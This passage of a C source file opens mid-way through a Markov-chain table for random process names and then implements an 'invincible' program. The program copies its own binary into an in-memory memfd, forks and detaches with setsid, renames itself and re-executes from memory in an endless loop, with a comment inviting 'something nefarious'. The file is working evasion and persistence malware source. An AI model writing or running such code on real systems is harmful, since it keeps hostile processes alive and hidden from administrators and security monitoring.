"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "r+,-./", "crtdpa", "6pcjtd", "rcplms", "dreoct", "tcrsvb", "scrdmp", "prnsce", "pu6dha", "decstv", "psacel", "cdbrsa", "pciafh", "labces", "d6sw+,", "6pcdst", "6hls+,", "d6cp+,", "vdijs+", "vn+,-.", "t+,-./", "dh+,-.", "+,-./0", "+,-./0", "+,-./0", "c+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "rvulmn", "mucrts", "ndtcrp", "trblcd", "tcrln-", "trcnsl", "tndlpr", "tcprld", "tdrlsy", "trlcgd", "btr_gl", "tlnrp|", "tclps|", "ctnlrp", "rtdelm", "nt|cv-", "tn|crd", "lnstdv", "tdlrs|", "tdn|gs", "lndmst", "trd+,-", "mnrkp+", "tnr+,-", "nkmprt", "ndgt+,", "ns+,-.", "+,-./0", "t+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "l+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "rtlia|", "emio_c", "iut2ce", "a|-eil", "lu|2or", "l|uaei", "m|eiul", "u|oa-l", "|l-mea", "o|lu-a", "lu|oc-", "i|lamo", "|io._a", "ujry|a", "onru|+", "|jnefo", "|a-eu+", "lu|f+,", "|j-+,.", "ja+,-.", "ujf|+,", "ufi|+,", "|fu+,-", "uir|+,", "u+,-./", "|g+,-.", "|+,-./", "|+,-./", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "alohet", "o|rail", "-oak|h", "ovahkl", "o|ahe-", "o|hetk", "ok|aht", "o-ekht", "okeh-t", "otlkhe", "oeahkt", "ohkas|", "ke|alo", "otclk|", "kr-htl", "ocet|a", "t-ahks", "l+aotc", "co+hkt", "-coeh+", "c-o+es", "c-lt|e", "-oks+,", "hl|+,-", "eo|+,-", "+,-./0", "o+,-./", "o+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "r+,-./", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "vebiru", "fbenig", "i|oe2f", "tei|-u", "e|fiuo", "|eiafr", "-|eiab", "e|aisb", "e|-iuo", "e-|aiu", "e|adiu", "-e|ais", "e|-aiu", "ae|gi.", "a|eu-d", "eado.b", "|erba_", "-leasu", "|_-.di", "|edlr-", "e|-r.d", "u_einr", "ueimr|", "|u-ir+", "e|u+,-", "|+,-./", "|e+,-.", "|s+,-.", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "xnub2s", "mxtsnr", "dnav|c", "xnsrdl", "rncm|x", "|xr-sn", "|rsnxc", "|-srcx", "|rlncs", "|rams-", "r|lsd-", "|r-snx", "|rns-t", "|rs-dn", "r|s-.l", "|rnat-", "|rs-ad", "r|s-cl", "|rtsld", "|rsnad", "r|dsmn", "r|-cde", "ldrs|+", "|alnpr", "r|sat+", "|a_psx", "n|+,-.", "rn+,-.", "+,-./0", "|+,-./", "+,-./0", "nt+,-.", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "aiolsf", "st-imf", "st2fil", "is|oaf", "o|ifrs", "o|ilfm", "i|olmf", "io|fsy", "is|lof", "is|-ol", "-itole", "ito|-e", "ioaeyd", "io|sy+", "ies+,-", "afisy|", "ilydef", "|iel+,", "defios", "e|ft+,", "ieo|+,", "dei|+,", "i|do+,", "d|+,-.", "|+,-./", "i+,-./", "+,-./0", "i+,-./", "+,-./0", "+,-./0", "io+,-.", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "elsrip", "m_rlec", "-eri2t", "eor2|_", "-e|rci", "|erids", "|eirha", "|ehmcr", "e|-irm", "|eil-t", "|eiu-s", "|e-as2", "w|-ciu", "|ne-hi", "wn|ced", "|i-pen", "n-eals", "cn|+es", "ce+lp|", "nc|+-e", "c+-ei,", "|+,-./", "-is|+,", "su|+,-", "s+,-./", "c|+,-.", "e|+,-.", "+,-./0", "|+,-./", "+,-./0", "+,-./0", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "p5wtea", "aoieck", "-ao|te", "io|ea-", "aei_tm", "e|tari", "|eaiot", "|aei-t", "|eotam", "|e-_am", "|eldoa", "|ae._i", "|eai-o", "|46def", "|otide", "|eabio", "|6e+,-", "eik|+,", "|a+,-.", "|emo+,", "e|6+,-", "|+,-./", "o+,-./", "e+,-./", "o|+,-.", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "6pdnmr", "nsbrpf", "-nslfr", "ntbcop", "nlcs-t", "nlts|m", "nctlps", "nlpsgt", "nlgst|", "ngolsc", "nslgep", "ngcp|l", "n-glp|", "gnopcl", "gnt|ld", "tgln|e", "pndosc", "npcotg", "lcnovt", "lp|deg", "npbcdo", "npbcgl", "lnbopt", "lnbcgm", "nlpt+,", "bln+,-", "lbdgr+", "abo+,-", "bgn+,-", "+,-./0", "n+,-./", "g+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "p+,-./", "+,-./0", }, {"+,-./0", "sapbce", "vspaib", "_|adps", "aiu|5e", "a426op", "ipbv|e", "aiosvc", "acdeis", "a|+,-.", "aos+,-", "sa|+,-", "ro+,-.", "a+,-./", "la+,-.", "cdeo+,", "u+,-./", "cd+,-.", "+,-./0", "+,-./0", "cd+,-.", "cds+,-", "cd+,-.", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "pdeaib", "ftbdsg", "e-|4_t", "e|.tdi", "|e-di2", "|eg-_f", "|-eugs", "|_etgi", "|eusag", "|e_-cd", "|u-eit", "e-|gis", "|e_cqt", "|egs-u", "|g-su+", "|-_ace", "e|+,-.", "ga|+,-", "e|+,-.", ".dg+,-", "+,-./0", "gr+,-.", "|+,-./", "-er|+,", "+,-./0", "e|+,-.", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "lidoav", "va-ies", "tiaoe|", "aio|el", "iea|ol", "se|iao", "|eiao-", "|iaeos", "i|leau", "ef|ila", "ei|oa_", "e|i.al", "|eadli", "ei|du-", "|aeild", "e|ial-", "e|il_d", "|eidot", "|elaid", "eidtf|", "deil|f", "ieostw", "i|aeft", "diaefs", "id|eft", "di|+,-", "di|+,-", "di+,-.", "+,-./0", "+,-./0", "e+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "l|+,-.", "-+,./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "bokatp", "lbawip", "tup-se", "-ae|pi", "ap|oei", "pd|iae", "|paelo", "|alpob", "a|poe-", "ip|eoa", "-p|ale", "ipe|lm", "iopeag", "aleimp", "o|bp-a", "oe|aip", "o|alp+", "|el_ai", "ep|o+,", "pe|+,-", "ap+,-.", "op|ace", ".op|+,", "epac|+", "pe|+,-", "pe+,-.", "p+,-./", "+,-./0", "p+,-./", "+,-./0", "e+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "l+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "leafos", "mdsi|v", "esodct", "tgdc|-", "of|tcd", "ft|dsc", "eft|dg", "dft|ce", "f|tdas", "ft|sgu", "uf|gcd", "gft-|c", "sftu|e", "gef|it", "u|gdis", "usteg-", "dt|age", "u|tefn", "adegs|", "adeflm", "aseltx", "-adfgm", "gemst|", "|dlaeg", "ceflmv", "dekl|+", "efl|+,", "p+,-./", "t|+,-.", "fm+,-.", "+,-./0", "st+,-.", "t+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "prscbt", "nurolc", "mntco-", "ncp-dr", "pnrosl", "np|olr", "n|lprt", "nr|ldo", "nlrotm", "nlrop|", "nrlm|o", "nglrm|", "nrlmo|", "ndro-l", "nrl-og", "tplrck", "lnrtv-", "nrblfo", "rnabl|", "v-bnrl", "nvlr-f", "rv-fln", "n|.flp", "nopdr|", "lor+,-", "lrnop+", "l+,-./", "m+,-./", "n+,-./", "+,-./0", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "apnbdg", "m-eits", "se-|ta", "d|alrt", "|alrdo", "|plane", "|amlep", "|lrasc", "|-al_e", "|rliye", "|dpl-a", "|aleth", "|la-pk", "p|elar", "l|saeh", "|deilp", "ta|k-i", "et|yil", "plr|-a", "|lreps", "|-kprt", "|r+,-.", "|lpty+", "|ory+,", "|y+,-.", "|+,-./", "|+,-./", "+,-./0", "r+,-./", "l+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "t+,-./", }, {"+,-./0", "emudtv", "lfnu|d", "-lnu2d", "udtaln", "utd-|+", "u|t+,-", "t-|u+,", "tu|+,-", "tul+,-", "t|+,-.", "t_+,-.", "ut+,-.", "tu+,-.", "t+,-./", "t|+,-.", "t+,-./", "m+,-./", "t+,-./", "+,-./0", "+,-./0", "+,-./0", "t+,-./", "t+,-./", "+,-./0", "t+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "ieaudt", "iaemoc", "e-acoi", "eao|vu", "eai|oc", "eia|ot", "ae|is-", "|ieaot", "|eotai", "|eaois", "|etao-", "|eatio", "|eai-t", "|e-ioa", "|eiayo", "|ieaoc", "|itvce", "|ei-2_", "|aecbd", "|eaio-", "|io-2t", "|aei2_", "aes-2d", "|aet+,", "a|beg+", "|itv+,", "+,-./0", "o|+,-.", "s+,-./", "i+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "i+,-./", "+,-./0", "+,-./0", }, {"+,-./0", "eymnpc", "tcld2e", "tce_s2", "te-hc|", "t|e-cp", "ty|e-p", "_|tech", "t|-eso", "|te-si", "|etalh", "|teois", "t|heio", "|teihp", "|hest-", "|tehcs", "th|i6e", "|tahoe", "|te.af", "|-tesc", "|tshei", "|sehuv", "h|-cei", "|lty+,", "|-e+,.", "|hs+,-", "|+,-./", "+,-./0", "y|+,-.", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "t+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "c+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "resiho", "prkaef", "e-oar|", "oea|ti", "2e|lor", "|eriao", "|eor-a", "|eoaih", "e|o-ai", "|eairo", "|e-iar", "|eoa-i", "|eo-ai", "|eo-r5", "i|er5a", "|oaei-", "e|aois", "|eoila", "o|5er_", "e|or_a", "oirclb", "|reu+,", "ocl|5b", "|o5eir", "o|e+,-", "e5+,-.", "-i+,./", "+,-./0", "|+,-./", "e+,-./", "+,-./0", "+,-./0", "-e|+,.", "a+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "|+,-./", }, {"+,-./0", "npbsru", "altnm-", "snt_m-", "-sntpm", "mnrapt", "mtnpge", "nimteg", "mnpsbr", "nmtgsf", "pmnaeg", "nmtxdl", "xpimgs", "nlegim", "xemspi", "npgrsb", "-lipen", "-lmst+", "mnairs", "-imads", "gmns+,", "dm+,-.", "imgp+,", "imp+,-", "mi+,-.", "imt+,-", "im+,-.", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "pmgida", "iramn3", "m_iua2", "iet|a5", "6e-i|a", "e|i_ag", "e|igsu", "e|gi-a", "ei|pr+", "e|iaos", "ei|abc", "eia0dm", "eais|+", "e|3abi", "e|+,-.", "e-i+,.", "e36ai|", "-ei+,.", "e+,-./", "ea|+,-", "-3e|+,", "-3124g", "-egi+,", "e+,-./", "+,-./0", "i+,-./", "e+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"|+,-./", "iaopeh", "-alfid", "a2eitk", "a2eimn", "iar|eh", "6|iadr", "i|3an6", "6|aedp", "a|eisd", "|eads-", "a|_eio", "adi+,-", "e-adn|", "3eri|+", "ae+,-.", "3p|+,-", "ior+,-", "i+,-./", "ik+,-.", "i+,-./", "or+,-.", "a+,-./", "r+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "8fdm4|", "ctrp|h", "eld2t|", "|e_ct-", "|p_e-h", "|tm-f8", "|t-bpx", "|-te1d", "|t-6_d", "|tm1ip", "t|-_em", "-|6em+", "-|ta8e", "8tdm+,", "-8e2d+", "m8ey|+", "8aem+,", "t|+,-.", "|+,-./", "t+,-./", "|+,-./", "y+,-./", "y+,-./", "+,-./0", "+,-./0", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "m+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "u4aepb", "stnpdg", "2t|nbc", "|-npec", "|pt.ae", "-|pu4e", "s|pn-m", "|-mdg2", "|s-_lm", "|-sfab", "|p-_lm", "|lps-k", "|_scdm", "|-rRbe", "|-tp+,", "|-p+,.", "|p_l+,", "|1_t+,", "ps|+,-", "|+,-./", "+,-./0", "p|+,-.", "|+,-./", "n|+,-.", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "-+,./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"pslmgc", "is|bve", "cmdir4", "|icers", "i|4bmo", "e-_|+,", "ei|cs+", "eaim+,", "e|d+,-", "eo+,-.", "oe+,-.", "eo|+,-", "oef+,-", "eaior+", "eos+,-", "ei+,-.", "e+,-./", "e+,-./", "e+,-./", "+,-./0", "e+,-./", "e+,-./", "e+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "|+,-./", }, };
char name[16];

unsigned int rand(unsigned int max) {
    unsigned int buf[1];
    read(3, &buf, sizeof(unsigned int));
    return buf[0] % max;
}

// Generate a new random name with markov chain
void new_name() {
    char c = '|';
    int n = 0;

    while (n < 15) {
        if (c == '|')
            c = 79 + 43;
        
        const char *key = chain[c-43][n];
        char next = key[rand(4)];

        if (next == '|')
            break;

        name[n] = next;
        c = next;
        n += 1;
    }

    name[n] = '\0';
}

int ends_with(char * a, char *b) {
    size_t alen = strlen(a);
    size_t blen = strlen(b);

    if (blen > alen)
        return 0;

    return strncmp(a + alen - blen, b, blen) == 0;
}

int main(int argc, char **argv) {
    if (ends_with(argv[0], "invincible")) {

        // Setup memfd to hold our binary
        int rand = open("/dev/urandom", O_RDONLY);  // fd will always be 3
        new_name();

        int mem = memfd_create(name, 0); // fd will always be 4

        // Find path to our binary
        pid_t pid = getpid();
        char path[128];
        sprintf(path, "/proc/%d/exe", pid);

        // Open and copy to memfd
        int exe = open(path, O_RDONLY);

        char buf[1024];
        for (;;) {
            size_t n = read(exe, buf, 1024);
            if (n == 0)
                break;

            char * loc = buf;
            while (n > 0) {
                size_t w = write(mem, loc, n);
                loc += w;
                n -= w;
            }
        }
    } else {
        // Set our name in the other ways that the system can see it
        prctl(PR_SET_NAME, (unsigned long) argv[0], 0, 0, 0);

        new_name();

        // Do something nefarious (optional)
        usleep(1000 * 300);
    }
    
    // Fork and let the parent die so we are an orphan
    if (fork() != 0)
        return 0;

    // detach from tty and pgroup
    setsid();

    // Execve into memfd
    //
    // File descriptors are preserved, so we can do this forever :)
    const char * const av[] = {name, NULL};
    const char * const ep[] = {NULL};
    int i = fexecve(4, (char * const *) av, (char * const *) ep);
    
    printf("fexec returned %d, errno=%d\n", i, errno);
}
